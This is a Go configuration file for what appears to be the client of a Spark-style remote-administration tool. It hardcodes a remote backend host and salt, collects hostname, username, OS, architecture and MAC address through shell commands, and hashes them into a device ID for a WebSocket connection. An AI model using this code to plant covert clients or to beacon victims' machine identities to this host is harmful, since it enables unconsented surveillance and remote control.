package config

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

// Configuration constants
const (
	Host = "spark-backend-fixed-v2.onrender.com"
	Port = 443
	Salt = "72415144205a3a1f5618223832aecbed"
)

// Client configuration
type Config struct {
	Host     string
	Port     int
	Salt     string
	DeviceID string
	Hostname string
	Username string
	OS       string
	Arch     string
}

// GetDefaultConfig returns the default configuration
func GetDefaultConfig() *Config {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}

	return &Config{
		Host:     Host,
		Port:     Port,
		Salt:     Salt,
		Hostname: hostname,
		Username: username,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
	}
}

// GenerateDeviceID generates a unique device ID based on system information
func (c *Config) GenerateDeviceID() string {
	// Get MAC address for unique identification
	var macAddr string
	if runtime.GOOS == "windows" {
		// Windows command to get MAC address
		cmd := exec.Command("getmac", "/fo", "csv", "/nh")
		output, err := cmd.Output()
		if err == nil {
			lines := strings.Split(string(output), "\n")
			if len(lines) > 0 {
				parts := strings.Split(lines[0], ",")
				if len(parts) > 0 {
					macAddr = strings.Trim(parts[0], "\"")
				}
			}
		}
	} else {
		// Unix-like systems
		cmd := exec.Command("sh", "-c", "cat /sys/class/net/*/address | head -1")
		output, err := cmd.Output()
		if err == nil {
			macAddr = strings.TrimSpace(string(output))
		}
	}

	// Create unique identifier
	uniqueString := fmt.Sprintf("%s-%s-%s-%s", c.Hostname, c.Username, c.OS, macAddr)
	hash := md5.Sum([]byte(uniqueString))
	return hex.EncodeToString(hash[:])
}

// GetServerURL returns the full server URL
func (c *Config) GetServerURL() string {
	return fmt.Sprintf("wss://%s:%d", c.Host, c.Port)
}

// GetHTTPURL returns the HTTP server URL
func (c *Config) GetHTTPURL() string {
	return fmt.Sprintf("https://%s", c.Host)
}